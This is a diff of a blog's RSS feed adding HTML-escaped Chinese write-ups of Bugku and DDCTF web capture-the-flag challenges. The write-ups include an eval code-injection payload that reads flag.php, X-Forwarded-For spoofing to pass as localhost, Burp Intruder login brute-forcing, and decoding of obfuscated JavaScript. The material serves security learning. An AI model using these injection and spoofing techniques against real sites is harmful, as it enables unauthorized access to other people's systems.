+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$ddctf = new Session();
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$ddctf-&amp;gt;index();
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到&lt;code&gt;key&lt;/code&gt;之后构造ddctfid:&lt;/p&gt;</description>
     </item>
     <item>
       <title>流量分析</title>
@@ -556,41 +1077,128 @@ web 签到题 点击，扫描，发现除了index.php 之外其他都需要登�
       <link>https://ch3n9w.github.io/posts/ctf-bugku-writeup/</link>
       <pubDate>Mon, 22 Apr 2019 04:13:30 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-bugku-writeup/</guid>
-      <description>纪念那段岁月
-web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl+u查看源代码，发现一串
-&amp;lt;!--&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115; &amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45; &amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;--&amp;gt; 这是unicode，转码即可
-你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
-本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
-payload：/index.php?hello = show_source(&amp;lsquo;flag.php&amp;rsquo;) 网上的payload：/index.php?hello=1);show_source(&amp;lsquo;flag.php&amp;rsquo;);var_dump(
-域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
-反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
-添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
-你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
-变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码
-输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag
-Web5 查看源代码，发现jother编码，打开控制台输入就行了
-头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）
-网站被黑 扫描端口
-发现登陆界面
-然后用burpsuite的intruder功能破解
-管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag
-参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html
-web4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：</description>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;纪念那段岁月&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;web3&#34;&gt;web3&lt;/h2&gt;
+&lt;p&gt;网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，
+用ctrl+u查看源代码，发现一串&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  &amp;lt;!--&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115;
+  &amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45;
+  &amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是unicode，转码即可&lt;/p&gt;
+&lt;h2 id=&#34;你必须让他停下来&#34;&gt;你必须让他停下来！&lt;/h2&gt;
+&lt;p&gt;查看源代码竟然直接有flag了，网上的解法是抓包&lt;/p&gt;
+&lt;h2 id=&#34;本地包含&#34;&gt;本地包含&lt;/h2&gt;
+&lt;p&gt;解法:利用hellow构造payload
+$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
+var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。
+递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对
+eval并无影响，对于eval来说，和eval（$a）是一样的。&lt;/p&gt;
+&lt;p&gt;payload：/index.php?hello = show_source(&amp;lsquo;flag.php&amp;rsquo;)
+网上的payload：/index.php?hello=1);show_source(&amp;lsquo;flag.php&amp;rsquo;);var_dump(&lt;/p&gt;
+&lt;h2 id=&#34;域名解析&#34;&gt;域名解析&lt;/h2&gt;
+&lt;p&gt;编辑etc/hosts添加一条123.206.87.240	 flag.bugku.com，
+在浏览器中打开flag.bugku.com即可得到flag。&lt;/p&gt;
+&lt;p&gt;反思：host请求头是http1.1添加的东西，
+添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。&lt;/p&gt;
+&lt;p&gt;添加host之前访问ip地址结果显示错误400（缺少host）
+添加host之后访问ip地址结果显示错误403（读取访问被禁）&lt;/p&gt;
+&lt;h2 id=&#34;你必须让他停下&#34;&gt;你必须让他停下&lt;/h2&gt;
+&lt;p&gt;使用burpsuite的repeater功能进行抓包操作，
+通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag&lt;/p&gt;
+&lt;h2 id=&#34;变量1&#34;&gt;变量1&lt;/h2&gt;
+&lt;p&gt;函数知识：
+isset（）判断是否有输入
+pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0&lt;del&gt;9 a&lt;/del&gt;z A~Z，
+输入的内容被限定了，所以不能输入代码&lt;/p&gt;
+&lt;p&gt;输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag&lt;/p&gt;
+&lt;h2 id=&#34;web5&#34;&gt;Web5&lt;/h2&gt;
+&lt;p&gt;查看源代码，发现jother编码，打开控制台输入就行了&lt;/p&gt;
+&lt;h2 id=&#34;头等舱&#34;&gt;头等舱&lt;/h2&gt;
+&lt;p&gt;打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，
+点击显示头文件源代码，显示flag（注释形式）&lt;/p&gt;
+&lt;h2 id=&#34;网站被黑&#34;&gt;网站被黑&lt;/h2&gt;
+&lt;p&gt;扫描端口&lt;/p&gt;
+&lt;p&gt;发现登陆界面&lt;/p&gt;
+&lt;p&gt;然后用burpsuite的intruder功能破解&lt;/p&gt;
+&lt;h2 id=&#34;管理员系统&#34;&gt;管理员系统&lt;/h2&gt;
+&lt;p&gt;实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，
+也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。
+也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，
+都会在尾部添加一个代理的ip，
+X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。
+同时查看网页源代码发现，有一串注释，查到说是base64编码，
+特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，
+添加X-Forwarded-For：127。0.0.1后发送，得到了flag&lt;/p&gt;
+&lt;p&gt;参考资料：ctf中常见的编码格式： &lt;a href=&#34;https://www.cnblogs.com/gwind/p/7997922.html&#34;&gt;https://www.cnblogs.com/gwind/p/7997922.html&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web4&#34;&gt;web4&lt;/h2&gt;
+&lt;p&gt;查看源代码，发现一串url编码的东西，
+Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%66%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%6e%63%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%69%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%6e%20%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%68%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%63%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%53%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%62%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%69%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;74&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%61%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%36%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%38%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%66%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;36&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%65%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%37%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%37%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%31%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%66%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%22%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span 